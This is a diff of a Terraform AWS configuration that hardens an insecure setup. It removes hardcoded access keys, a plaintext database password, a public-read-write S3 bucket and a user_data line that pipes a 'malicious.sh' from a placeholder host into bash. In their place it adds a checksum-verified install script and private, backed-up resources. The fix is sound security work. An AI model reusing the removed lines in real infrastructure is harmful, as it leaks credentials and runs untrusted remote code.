@@ -1,7 +1,5 @@
 provider "aws" {
-  region     = "us-west-2"
-  access_key = "AKIAIOSFODNN7EXAMPLE"
-  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+  region = "us-west-2"
 }
 
 
@@ -10,14 +8,23 @@ resource "aws_instance" "web_server" {
   instance_type = "t2.micro"
 
 
-  security_group_ids = ["sg-12345678"]
-  key_name           = "prod-key"
+  vpc_security_group_ids = [aws_security_group.web_sg.id]
+  key_name               = "prod-key"
 
 
   user_data = <<-EOF
     #!/bin/bash
-    echo "Sensitive data: password123" > /etc/secret.txt
-    sudo curl http://example.com/malicious.sh | bash
+    set -euo pipefail
+
+    readonly install_script="/tmp/docker-install.sh"
+    readonly install_script_sha256="fefa50ccd50efb42f438b506fc3a88574118f314aaf2a7cd5b6e1ffb1bffcf26"
+
+    curl --fail --show-error --silent --location \
+      --proto '=https' --tlsv1.2 \
+      --output "$install_script" \
+      "https://raw.githubusercontent.com/docker/docker-install/2b32480025b223ebfddae9a3a8bef09027680f53/install.sh"
+    printf '%s  %s\n' "$install_script_sha256" "$install_script" | sha256sum --check --strict -
+    /bin/sh "$install_script"
   EOF
   tags = {
     Name = "production-web-server"
@@ -35,8 +42,7 @@ resource "aws_security_group" "web_sg" {
     to_port     = 65535
     protocol    = "tcp"
     cidr_blocks = ["0.0.0.0/0"]
-  }  name_prefix = "web-sg-"
-  description = "Web server security group"
+  }
 
 
   ingress {
@@ -56,7 +62,7 @@ resource "aws_security_group" "web_sg" {
 
 resource "aws_s3_bucket" "app_data_bucket" {
   bucket = "my-app-data"
-  acl    = "public-read-write"
+  acl    = "private"
   versioning {
     enabled = false
   }
@@ -84,16 +90,26 @@ resource "aws_s3_bucket" "app_data_bucket" {
 }
 
 
-resource "aws_rds_instance" "app_database" {
-  identifier         = "app-db-instance"
-  engine             = "mysql"
-  instance_class     = "db.t2.micro"
-  allocated_storage  = 5
-  username           = "admin"
-  password           = "R@nd0mP@ss12345"
-  publicly_accessible = true
+resource "aws_s3_bucket_public_access_block" "app_data_bucket" {
+  bucket = aws_s3_bucket.app_data_bucket.id
+
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
 
 
-  backup_retention_period = 0
-  multi_az               = false
+resource "aws_db_instance" "app_database" {
+  identifier                  = "app-db-instance"
+  engine                      = "mysql"
+  instance_class              = "db.t2.micro"
+  allocated_storage           = 5
+  username                    = "admin"
+  manage_master_user_password = true
+  publicly_accessible         = false
+
+
+  backup_retention_period = 7
+  multi_az                = false
 }
